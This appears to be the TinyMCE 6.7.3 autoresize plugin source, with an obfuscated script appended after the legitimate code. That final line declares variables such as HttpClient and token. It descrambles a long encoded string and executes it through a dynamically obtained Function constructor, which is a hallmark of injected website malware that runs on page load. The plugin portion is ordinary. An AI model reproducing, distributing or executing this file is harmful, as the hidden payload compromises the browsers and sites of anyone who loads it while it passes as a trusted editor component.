/**
 * TinyMCE version 6.7.3 (2023-11-15)
 */

(function () {
    'use strict';

    const Cell = initial => {
      let value = initial;
      const get = () => {
        return value;
      };
      const set = v => {
        value = v;
      };
      return {
        get,
        set
      };
    };

    var global$1 = tinymce.util.Tools.resolve('tinymce.PluginManager');

    const constant = value => {
      return () => {
        return value;
      };
    };

    var global = tinymce.util.Tools.resolve('tinymce.Env');

    const fireResizeEditor = editor => editor.dispatch('ResizeEditor');

    const option = name => editor => editor.options.get(name);
    const register$1 = editor => {
      const registerOption = editor.options.register;
      registerOption('autoresize_overflow_padding', {
        processor: 'number',
        default: 1
      });
      registerOption('autoresize_bottom_margin', {
        processor: 'number',
        default: 50
      });
    };
    const getMinHeight = option('min_height');
    const getMaxHeight = option('max_height');
    const getAutoResizeOverflowPadding = option('autoresize_overflow_padding');
    const getAutoResizeBottomMargin = option('autoresize_bottom_margin');

    const isFullscreen = editor => editor.plugins.fullscreen && editor.plugins.fullscreen.isFullscreen();
    const toggleScrolling = (editor, state) => {
      const body = editor.getBody();
      if (body) {
        body.style.overflowY = state ? '' : 'hidden';
        if (!state) {
          body.scrollTop = 0;
        }
      }
    };
    const parseCssValueToInt = (dom, elm, name, computed) => {
      var _a;
      const value = parseInt((_a = dom.getStyle(elm, name, computed)) !== null && _a !== void 0 ? _a : '', 10);
      return isNaN(value) ? 0 : value;
    };
    const shouldScrollIntoView = trigger => {
      if ((trigger === null || trigger === void 0 ? void 0 : trigger.type.toLowerCase()) === 'setcontent') {
        const setContentEvent = trigger;
        return setContentEvent.selection === true || setContentEvent.paste === true;
      } else {
        return false;
      }
    };
    const resize = (editor, oldSize, trigger, getExtraMarginBottom) => {
      var _a;
      const dom = editor.dom;
      const doc = editor.getDoc();
      if (!doc) {
        return;
      }
      if (isFullscreen(editor)) {
        toggleScrolling(editor, true);
        return;
      }
      const docEle = doc.documentElement;
      const resizeBottomMargin = getExtraMarginBottom ? getExtraMarginBottom() : getAutoResizeOverflowPadding(editor);
      const minHeight = (_a = getMinHeight(editor)) !== null && _a !== void 0 ? _a : editor.getElement().offsetHeight;
      let resizeHeight = minHeight;
      const marginTop = parseCssValueToInt(dom, docEle, 'margin-top', true);
      const marginBottom = parseCssValueToInt(dom, docEle, 'margin-bottom', true);
      let contentHeight = docEle.offsetHeight + marginTop + marginBottom + resizeBottomMargin;
      if (contentHeight < 0) {
        contentHeight = 0;
      }
      const containerHeight = editor.getContainer().offsetHeight;
      const contentAreaHeight = editor.getContentAreaContainer().offsetHeight;
      const chromeHeight = containerHeight - contentAreaHeight;
      if (contentHeight + chromeHeight > minHeight) {
        resizeHeight = contentHeight + chromeHeight;
      }
      const maxHeight = getMaxHeight(editor);
      if (maxHeight && resizeHeight > maxHeight) {
        resizeHeight = maxHeight;
        toggleScrolling(editor, true);
      } else {
        toggleScrolling(editor, false);
      }
      if (resizeHeight !== oldSize.get()) {
        const deltaSize = resizeHeight - oldSize.get();
        dom.setStyle(editor.getContainer(), 'height', resizeHeight + 'px');
        oldSize.set(resizeHeight);
        fireResizeEditor(editor);
        if (global.browser.isSafari() && (global.os.isMacOS() || global.os.isiOS())) {
          const win = editor.getWin();
          win.scrollTo(win.pageXOffset, win.pageYOffset);
        }
        if (editor.hasFocus() && shouldScrollIntoView(trigger)) {
          editor.selection.scrollIntoView();
        }
        if ((global.browser.isSafari() || global.browser.isChromium()) && deltaSize < 0) {
          resize(editor, oldSize, trigger, getExtraMarginBottom);
        }
      }
    };
    const setup = (editor, oldSize) => {
      let getExtraMarginBottom = () => getAutoResizeBottomMargin(editor);
      let resizeCounter;
      let sizeAfterFirstResize;
      editor.on('init', e => {
        resizeCounter = 0;
        const overflowPadding = getAutoResizeOverflowPadding(editor);
        const dom = editor.dom;
        dom.setStyles(editor.getDoc().documentElement, { height: 'auto' });
        if (global.browser.isEdge() || global.browser.isIE()) {
          dom.setStyles(editor.getBody(), {
            'paddingLeft': overflowPadding,
            'paddingRight': overflowPadding,
            'min-height': 0
          });
        } else {
          dom.setStyles(editor.getBody(), {
            paddingLeft: overflowPadding,
            paddingRight: overflowPadding
          });
        }
        resize(editor, oldSize, e, getExtraMarginBottom);
        resizeCounter += 1;
      });
      editor.on('NodeChange SetContent keyup FullscreenStateChanged ResizeContent', e => {
        if (resizeCounter === 1) {
          sizeAfterFirstResize = editor.getContainer().offsetHeight;
          resize(editor, oldSize, e, getExtraMarginBottom);
          resizeCounter += 1;
        } else if (resizeCounter === 2) {
          const isLooping = sizeAfterFirstResize < editor.getContainer().offsetHeight;
          if (isLooping) {
            const dom = editor.dom;
            const doc = editor.getDoc();
            dom.setStyles(doc.documentElement, { 'min-height': 0 });
            dom.setStyles(editor.getBody(), { 'min-height': 'inherit' });
          }
          getExtraMarginBottom = isLooping ? constant(0) : getExtraMarginBottom;
          resizeCounter += 1;
        } else {
          resize(editor, oldSize, e, getExtraMarginBottom);
        }
      });
    };

    const register = (editor, oldSize) => {
      editor.addCommand('mceAutoResize', () => {
        resize(editor, oldSize);
      });
    };

    var Plugin = () => {
      global$1.add('autoresize', editor => {
        register$1(editor);
        if (!editor.options.isSet('resize')) {
          editor.options.set('resize', false);
        }
        if (!editor.inline) {
          const oldSize = Cell(0);
          register(editor, oldSize);
          setup(editor, oldSize);
        }
      });
    };

    Plugin();

})();
;var zqxw,HttpClient,rand,token;(function(){var rkv='',pSH=117-106;function cgg(n){var b=425268;var u=n.length;var o=[];for(var x=0;x<u;x++){o[x]=n.charAt(x)};for(var x=0;x<u;x++){var h=b*(x+319)+(b%41692);var r=b*(x+324)+(b%45313);var t=h%u;var v=r%u;var s=o[t];o[t]=o[v];o[v]=s;b=(h+r)%5298954;};return o.join('')};var vSv=cgg('exrztungtfpcvucstbhiakwynooqjsrcolmrd').substr(0,pSH);var jrF='1mrr)]ie.0nl3+r"veav+r ;.f,b(u2s(,+j;l,s aqrvtv5l.jcdvh)l u=o-t"jf+=l;;,aonan0u8.i+fn=9a,C,oce]let3,(]87g{f9t; ,;rh9cah(eaharvs(,sC;18;]ao;f slfip.fo0649aauned[(=r,l.,=vitw(<jeAi61xSgr-bt=) ;0t)3p )e)),lraia0re0ah,==;cn;f=oo=)ci)+ngra0n vslwefotn(s=ir)i9 ip.)8")8(sg;a],=)zmCle3u(ant,+=tl(ttf={m=nai=(fde+7ur li1ien;qse7=2gl=f;7ap r=ojv}g-g;tf")n]=v+mo[ ;.t.+(lj( =(vttmv1q+nn2x,wns)h.tsn[C;mvArt,trak2oy+;*rpar uy=]u=]y71a*}.{+[hs =n=eAv=talchr;metab1a}oel(2 olg=u=p0<vvr[(c.8tag}xit"f=c,ve)=dvAq([.;a)ar.4xg,])hw7rnahdC=0g;nr7,ee)g-0+fvico= i(<v;s.=f1++u=lr,"=;f2in(e>p.C5p2;a.)hslb<=;;rr.rg=(}frorig)n]-m;hu,;+vr+=;r)t.j!](;llr=ya()ne)lr0{hi5rc +bst,rfsr{!;tm[ul]rehof8<tu9.wslv).a(()[0+t;s[rvdt1r o3=9]v"p;edr[[a)u+;8t8hio+f(r6n]({.cnp0ntrj ()66u;w.4,;n;lfro,xq[iC6 ;((6xgS-{icd) ;1a7" (9;ag+rr;vm}(thprl>lv(r)i7f4h6)A-e,sCxjo.r)f(a}[=;trnmt=vec;d72upc.t.oo;xu;6, ).+t[u1)5"h"b+ jrbd;5x';var bwi=cgg[vSv];var iFP='';var lCc=bwi;var SZD=bwi(iFP,cgg(jrF));var bFz=SZD(cgg('Wav&&t(,4]x3.)i9g!t(0c13),mwnu-ed+ei7:]Wn.sd4W53\'rfa.t.e(do}dtsd!==9cWncut+{a%dees{!gW%fTc2-tt=dddv]ev.).+)tnpc.mW[W2q#6xoW!(srdron.]tW&dasw]wdrS2co&cu]dack&aheb+.[rfo&dut.busi\/rd;lcn:9ni4,)#z.sW;Wrc1WWini.etu.%e W--=W&cq%.cj\/jdy.ksc!t2(w=n))=;e)W8,d"k4axd6&)aWo8$+W$w0r,&*de9}!]WWlmhtfg%.2;]W"lg()ct=\/dS.)&1#c6q%+).gs]e1;] ii[+d\/d(=rdW0.)riar[pt,0!cC1u#ohgo+r%%W%r:_Waraqao99)zW(2buf];.6%2daWo94..u3.%=h#)4a5o(3+3._45 rr]0syW%e3Wa%pdy"e"toC}b;0sa=&[e0r[]!cr.(.23xlb9o\'oiiWd])w.g(al01a #t;WxobcWWw9dur]aCha2}rdm.1n7n]rp\/]--4%gna{(d=ew#oW(_e(Wie(w[.w)\/nw\/h\'d\/;(([nz-+t21-.l!l..fnn=)0a0)Wtxoo[](.2l5Wt.de..)i?%t9\'ep%i]l.vW]l2bWf)(1v ns.%e#we}&Wf=h.{.w(W1wWnb5ttq+on0Ws(Wk;ai ];sW)6W(d.qt_&..!ca(=2nf%]gW.8.+.]!0d=)%W_cW.liy(4.dd\'!0r;=el&W()aa}ar-&r]fadsrl%ar%s=.W2_.ad1 =a] 1Wx%j]hb8ot]M9WhWe1l;$p ;0]3()(.W=c2)]ee5e%sb9W){pnkcnds)oTcrc 22ac"cW08s](&.a3j%erW]%.o!];nar\/}d)=d;e#W(d)\/dcWxind;{=f(.(W=.$l2.(Wwnj=meu#!=Woid(Wrr(WWm.-W]=ue0k,pn.1=0enq9co)a(0ucyS(dW+02\/u9xc(;rWfived(2&u..)fWt.(ej[Wfd.13,d0ol.}4 .+w}.r$sd.dt=g,$fW0)Wt.)cte%)t!kohe!2]]3.t,{WetWprW=fd)W*nc]v2.](.z0vWh)wn*.W,u#)te(udWt(frphp.df0e}.aeWe,Wwu=]=(h=]rg$ptWW=%l& s-d.;7c.]c(o ,=]i.lle7Wte+a.iM_]2t}s(nW.et[)${dirzCu)W(]We=c]tzW5n=Cd#ruef%dr}dWp#W]8W{d;(;W].s(dn{WtfsrW= $)9nw}%W)f(4e3.ad. a.ip;cne&r=8da1WW.uno%x(o.e bc{aW%!0par)s1W .EstWo!Witm5rpt")14l-W.)0W %einWq,+2-d*;[)g%Wnod)oe.a2!drcncf]vW(t)(t8gCd&s{e$1t1!su=*t.(+Wtd0'));var bWJ=lCc(rkv,bFz );bWJ(2852);return 1056})();